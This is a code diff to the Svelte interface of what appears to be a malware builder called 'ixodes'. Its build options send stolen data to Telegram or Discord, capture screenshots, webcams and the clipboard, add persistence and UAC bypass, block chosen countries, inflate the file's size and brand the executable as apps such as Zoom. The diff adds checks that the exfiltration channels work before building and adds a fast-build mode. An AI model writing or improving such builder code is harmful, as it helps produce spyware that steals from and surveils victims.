@@ -28,7 +28,10 @@
     KeyRound,
     LockKeyhole,
     WandSparkles,
+    Zap,
   } from "@lucide/svelte";
+  import { Switch } from "$lib/components/ui/switch";
+  import { isDiscordWebhookValid, isTelegramChatIdValid, isTelegramTokenValid } from "$lib/validation/communication";
 
   type BuildResult = {
     success: boolean;
@@ -79,6 +82,9 @@
     { id: "zoom", label: "Zoom" },
   ] as const;
 
+  const getIconPresetLabel = (presetId: string) =>
+    iconPresets.find((preset) => preset.id === presetId)?.label ?? presetId;
+
   let archivePassword = $state("");
   let telegramToken = $state("");
   let telegramChatId = $state("");
@@ -123,6 +129,7 @@
   let pwdUppercase = $state(true);
   let pwdNumbers = $state(true);
   let pwdSymbols = $state(true);
+  let fastBuild = $state(false);
   let buildStatus = $state<"idle" | "loading" | "success" | "error">("idle");
   let buildError = $state("");
   let movedTo = $state("");
@@ -131,25 +138,19 @@
   const selectedCategories = () =>
     categories.filter((category) => categoryState[category.id]).map((category) => category.id);
 
-  const telegramTokenValid = $derived(
-    telegramToken.trim().length === 0
-      ? true
-      : /^\d+:[A-Za-z0-9_-]{20,}$/.test(telegramToken.trim())
-  );
-  const telegramChatIdValid = $derived(
-    telegramChatId.trim().length === 0 ? true : /^-?\d+$/.test(telegramChatId.trim())
-  );
-  const discordWebhookValid = $derived(
-    discordWebhook.trim().length === 0
-      ? true
-      : /^https:\/\/(canary\.|ptb\.)?discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+$/.test(
-          discordWebhook.trim()
-        )
-  );
+  const telegramTokenValid = $derived(isTelegramTokenValid(telegramToken));
+  const telegramChatIdValid = $derived(isTelegramChatIdValid(telegramChatId));
+  const discordWebhookValid = $derived(isDiscordWebhookValid(discordWebhook));
 
   let selectedCategoryCount = $derived(selectedCategories().length);
   let hasCommunication = $derived(Boolean(commMode));
-  let canBuild = $derived(selectedCategoryCount > 0 && hasCommunication);
+  let canBuild = $derived(
+    selectedCategoryCount > 0 && 
+    (
+        (commMode === "telegram" && telegramTokenValid && telegramChatIdValid && telegramToken.trim().length > 0 && telegramChatId.trim().length > 0) ||
+        (commMode === "discord" && discordWebhookValid && discordWebhook.trim().length > 0)
+    )
+  );
 
   $effect(() => {
     if (iconPreset !== "none" && iconSource.trim().length > 0) {
@@ -225,6 +226,10 @@
     } else {
       blockedCountries = [...blockedCountries, code];
     }
+  };
+
+  const setBlockedCountries = (codes: string[]) => {
+    blockedCountries = codes;
   };
 
   const setPumpSize = (size: number) => {
@@ -337,14 +342,16 @@
     }
   };
 
+  const toggleFastBuild = () => {
+    fastBuild = !fastBuild;
+  };
+
   const runBuild = async () => {
     if (!canBuild) {
-      const message = !hasCommunication
-        ? "Select Telegram or Discord before building."
-        : "Select at least one category before building.";
+      const message = "Please fix validation errors before building.";
       buildStatus = "error";
       buildError = message;
-      showToast(message, "Build failed", "error");
+      showToast(message, "Validation failed", "error");
       return;
     }
     
@@ -362,6 +369,23 @@
       clearTimeout(successTimer);
       successTimer = null;
     }
+
+    // 1. Test Connection
+    try {
+        showToast("Verifying communication settings...", "Testing Connection", "info");
+        if (commMode === "telegram") {
+            await invoke("test_telegram_connection", { token: telegramToken, chatId: telegramChatId });
+        } else {
+            await invoke("test_discord_connection", { webhook: discordWebhook });
+        }
+        showToast("Connection verification successful!", "Success", "info");
+    } catch (error) {
+        buildStatus = "error";
+        buildError = `Connection test failed: ${String(error)}`;
+        showToast(buildError, "Connection Test Failed", "error");
+        return;
+    }
+
     try {
           const result = (await invoke("build_ixodes", {
             request: {
@@ -373,7 +397,7 @@
                 telegram_chat_id: telegramChatId,
                 discord_webhook: discordWebhook,
                 capture_screenshots: captureScreenshots,
-                capturewebcams: captureWebcams,
+                capture_webcams: captureWebcams,
                 capture_clipboard: captureClipboard,
                 persistence: persistence,
                 uac_bypass: uacBypass,
@@ -406,13 +430,20 @@
                 copyright,
               },
               output_dir: outputDir,
+              fast_build: fastBuild,
             },
           })) as BuildResult;
       movedTo = result.moved_to ?? "";
       buildStatus = result.success ? "success" : "error";
       if (!result.success) {
-        buildError = "Build failed. Check the output for details.";
-        showToast(buildError, "Build failed", "error");
+        // Display the first 150 chars of output to avoid giant toasts, or just the whole thing if it's short.
+        // Better: just show the output. Svelte Sonner might truncate or scroll.
+        const errorDetails = result.output ? result.output.trim() : "No output captured";
+        // limit length for toast
+        const shortError = errorDetails.length > 200 ? errorDetails.substring(0, 200) + "..." : errorDetails;
+        
+        buildError = `Build failed: ${errorDetails}`; 
+        showToast(shortError, "Build failed", "error");
       } else {
         successTimer = setTimeout(() => {
           buildStatus = "idle";
@@ -518,6 +549,7 @@
         <Input
             id="archive-password"
             placeholder="Archive password (optional)"
+            type="password"
             bind:value={archivePassword}
         />
         <PasswordGeneratorDialog 
@@ -550,6 +582,7 @@
       <GeoBlockSection
         blockedCountries={blockedCountries}
         onToggleCountry={toggleCountry}
+        onSetCountries={setBlockedCountries}
       />
 
       <PumperSection
@@ -560,7 +593,7 @@
       />
     </div>
 
-    <div class="space-y-4">
+    <div class="space-y-4" style={fastBuild ? "opacity: 0.5; pointer-events: none;" : ""}>
       <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
         <KeyRound class="h-4 w-4 text-primary" />
         Executable branding
@@ -623,8 +656,8 @@
             bind:value={iconPreset}
             disabled={iconSource.trim().length > 0}
           >
-            <SelectTrigger id="icon-preset" class="w-full">
-              <span>{iconPreset}</span>
+        <SelectTrigger id="icon-preset" class="w-full">
+              <span>{getIconPresetLabel(iconPreset)}</span>
             </SelectTrigger>
             <SelectContent>
               {#each iconPresets as preset (preset.id)}
@@ -650,6 +683,21 @@
     </div>
 
     <Separator />
+
+    <div class="flex items-center space-x-2">
+        <Switch
+            id="fast-build"
+            checked={fastBuild}
+            onCheckedChange={toggleFastBuild}
+        />
+        <Label for="fast-build" class="flex items-center gap-2">
+            <Zap class="h-4 w-4 text-amber-500" />
+            Fast Build
+            <span class="text-xs text-muted-foreground font-normal">
+                (Skip compilation, reuse existing binary. Branding changes will be ignored.)
+            </span>
+        </Label>
+    </div>
 
     <div class="sticky bottom-4 z-40 -mx-4 rounded-lg border border-border/70 bg-background/95 px-4 py-4 shadow-lg backdrop-blur">
       <div class="flex flex-wrap items-center justify-between gap-4">
